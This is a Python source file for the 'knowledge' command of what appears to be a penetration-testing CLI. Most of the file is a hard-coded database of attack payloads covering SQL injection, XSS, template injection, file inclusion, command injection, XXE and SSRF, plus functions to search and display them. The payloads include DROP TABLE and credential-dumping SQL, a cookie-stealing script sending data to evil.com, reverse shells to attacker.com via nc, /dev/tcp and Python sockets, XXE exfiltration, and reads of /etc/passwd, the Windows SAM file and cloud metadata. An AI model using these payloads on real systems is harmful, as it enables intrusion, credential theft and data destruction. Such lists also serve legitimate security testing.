"""
Knowledge Command - Manage knowledge base.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()


# ══════════════════════════════════════════════════════════════════════════════
# Payload Database (in-memory for now, will use LanceDB later)
# ══════════════════════════════════════════════════════════════════════════════


PAYLOAD_DATABASE = {
    "sqli": {
        "name": "SQL Injection",
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1; DROP TABLE users--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
    },
    "xss": {
        "name": "Cross-Site Scripting",
        "payloads": [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
        ],
    },
    "ssti": {
        "name": "Server-Side Template Injection",
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{config.__class__.__init__.__globals__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
    },
    "lfi": {
        "name": "Local File Inclusion",
        "payloads": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "....\\\\....\\\\....\\\\windows\\system32\\config\\sam",
        ],
    },
    "rce": {
        "name": "Remote Code Execution",
        "payloads": [
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| nc attacker.com 4444 -e /bin/sh",
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        ],
    },
    "xxe": {
        "name": "XML External Entity",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">]>',
        ],
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "payloads": [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0",
            "http://2130706433",  # 127.0.0.1 as decimal
            "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1 as hex
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
        ],
    },
}


async def search_knowledge(query: str) -> None:
    """Search knowledge base."""
    query_lower = query.lower()
    results = []

    for category, data in PAYLOAD_DATABASE.items():
        if query_lower in category or query_lower in data["name"].lower():
            results.append((category, data))
        else:
            # Search in payloads
            matching_payloads = [p for p in data["payloads"] if query_lower in p.lower()]
            if matching_payloads:
                results.append((category, {**data, "payloads": matching_payloads}))

    if not results:
        console.print(f"[dim]No results found for: {query}[/dim]")
        console.print("[dim]Try: sqli, xss, ssti, lfi, rce, xxe, ssrf[/dim]")
        return

    for category, data in results:
        table = Table(title=f"{data['name']} ({category})")
        table.add_column("#", style="dim", width=3)
        table.add_column("Payload", style="cyan")

        for i, payload in enumerate(data["payloads"][:10], 1):
            # Truncate long payloads
            if len(payload) > 70:
                display = payload[:67] + "..."
            else:
                display = payload
            table.add_row(str(i), display)

        console.print(table)
        console.print()


async def list_categories() -> None:
    """List available payload categories."""
    table = Table(title="Payload Categories")
    table.add_column("Category", style="cyan")
    table.add_column("Name")
    table.add_column("Count", justify="right")

    for category, data in PAYLOAD_DATABASE.items():
        table.add_row(category, data["name"], str(len(data["payloads"])))

    console.print(table)
    console.print(
        "\n[dim]Search with: numasec knowledge search --query 'sqli'[/dim]"
    )


async def show_payloads(category: str) -> None:
    """Show all payloads for a category."""
    if category not in PAYLOAD_DATABASE:
        console.print(f"[red]Unknown category: {category}[/red]")
        await list_categories()
        return

    data = PAYLOAD_DATABASE[category]
    
    console.print(
        Panel(
            "\n".join(f"[cyan]{i}.[/cyan] {p}" for i, p in enumerate(data["payloads"], 1)),
            title=f"📚 {data['name']} Payloads",
            border_style="cyan",
        )
    )


async def add_payload(category: str, payload: str) -> None:
    """Add a new payload."""
    if category not in PAYLOAD_DATABASE:
        console.print(f"[yellow]Creating new category: {category}[/yellow]")
        PAYLOAD_DATABASE[category] = {
            "name": category.upper(),
            "payloads": [],
        }

    PAYLOAD_DATABASE[category]["payloads"].append(payload)
    console.print(f"[green]Added payload to {category}[/green]")


async def handle_knowledge(
    action: str,
    query: str | None = None,
    category: str | None = None,
    payload: str | None = None,
) -> None:
    """Handle knowledge command."""
    if action == "search" and query:
        await search_knowledge(query)
    elif action == "list":
        await list_categories()
    elif action == "show" and category:
        await show_payloads(category)
    elif action == "add" and category and payload:
        await add_payload(category, payload)
    else:
        console.print(
            Panel(
                "[cyan]Available actions:[/cyan]\n\n"
                "  list                     - List payload categories\n"
                "  search --query 'sqli'    - Search knowledge base\n"
                "  show --category 'xss'    - Show payloads for category\n"
                "  add --category X --payload Y  - Add new payload\n\n"
                "[dim]Categories: sqli, xss, ssti, lfi, rce, xxe, ssrf[/dim]",
                title="📚 Knowledge Command",
                border_style="cyan",
            )
        )
